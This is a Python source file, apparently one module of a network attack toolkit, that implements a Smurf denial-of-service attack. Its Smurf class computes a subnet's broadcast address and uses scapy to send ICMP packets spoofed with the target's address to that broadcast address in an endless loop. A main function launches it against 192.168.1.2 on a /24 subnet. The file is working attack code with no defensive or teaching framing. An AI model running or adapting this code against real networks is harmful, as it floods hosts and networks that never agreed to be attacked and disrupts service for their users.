from attacker import Attacker

class Smurf(Attacker):
	"""
	Parameters
	----------
	target : str
		The target's hostname or IP address
	subnet_mask : str
		The subnet's CIDR prefix (eg., 24)

	Methods
	-------
	compute_broadcast_addr()
		Returns the broadcast address of the target subnet
	print_broadcast_addr()
		Prints the broadcast address of the target subnet
	start()
		Sends spoofed ICMP packets to the target broadcast address
	"""

	def __init__(self, target, subnet_mask):
		"""
		Parameters
        ----------
		target : str
			The target's hostname or IP address
		subnet_mask : str
			The subnet's CIDR prefix (eg., 24)
		"""
		super().__init__(target, attack="SMURF")
		self.broadcast_ipv4 = self.compute_broadcast_addr(subnet_mask)

	def compute_broadcast_addr(self, subnet_mask) -> str:
		"""Returns the broadcast address of the target subnet"""
		from netaddr import IPNetwork
		addr = (IPNetwork(self.target_ipv4+"/"+subnet_mask)).broadcast
		return str(addr)

	def print_broadcast_addr(self):
		"""Prints the broadcast address of the target subnet"""
		print("[*] The target broadcast address: {}".format(self.broadcast_ipv4))

	def start(self):
		"""Sends spoofed ICMP packets to the target broadcast address"""
		from scapy.all import IP, ICMP, send

		pkt = IP(src=self.target_ipv4, dst=self.broadcast_ipv4)/ICMP()

		print("[*] SMURF attack started")
		send(pkt, verbose=False, loop=True)

def main():
	a = Smurf("192.168.1.2", "24")
	a.print_broadcast_addr()
	a.print_target_ip()
	a.start()

if __name__ == "__main__":
	main()